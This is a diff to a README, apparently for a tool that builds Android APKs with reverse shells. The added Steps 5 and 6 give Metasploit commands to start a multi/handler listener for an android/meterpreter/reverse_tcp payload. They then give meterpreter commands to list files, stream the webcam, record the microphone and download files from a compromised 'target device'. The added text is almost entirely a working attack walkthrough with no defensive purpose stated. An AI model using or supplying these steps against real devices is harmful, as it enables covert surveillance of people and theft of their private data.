@@ -95,6 +95,62 @@ After running the tool, follow the on-screen instructions to use the tool effect
 
 ---
 
+### Step 5. **Deploy the APK**
+
+### **Set Up the Listener (Metasploit)**
+If the APK was created to generate a reverse shell (using `msfvenom`), you need to set up a **listener** to handle the connection.
+
+#### ** 1aunch Metasploit Framework:**
+Start Metasploit:
+```bash
+msfconsole
+```
+
+#### ** Set Up the Listener:**
+ Use the **multi/handler** module:
+   ```bash
+   use exploit/multi/handler
+   ```
+ Set the payload to match the one used in your APK:
+   ```bash
+   set payload android/meterpreter/reverse_tcp
+   ```
+ Set the **LHOST** (local IP) and **LPORT** (port) values:
+   ```bash
+   set LHOST 192.168.18.88  # Replace with your local IP
+   set LPORT 4444           # Use the same port you specified
+   ```
+ Start the listener:
+   ```bash
+   exploit
+   ```
+
+---
+
+### **Trigger the APK**
+Once the APK is installed and opened on the target device, it will attempt to connect back to the Metasploit listener. If the connection is successful, you’ll see a `meterpreter` session in Metasploit.
+
+---
+
+### Step 6. **Interact with the Target**
+After gaining a session, you can interact with the target device. For example:
+- List files:
+  ```bash
+  meterpreter > ls
+  ```
+- Access the camera:
+  ```bash
+  meterpreter > webcam_stream
+  ```
+- Record audio:
+  ```bash
+  meterpreter > record_mic
+  ```
+- Download files:
+  ```bash
+  meterpreter > download /sdcard/filename
+  ```
+  
 ### Troubleshooting
 If you run into any errors or issues:
 - Ensure that all dependencies are installed correctly.
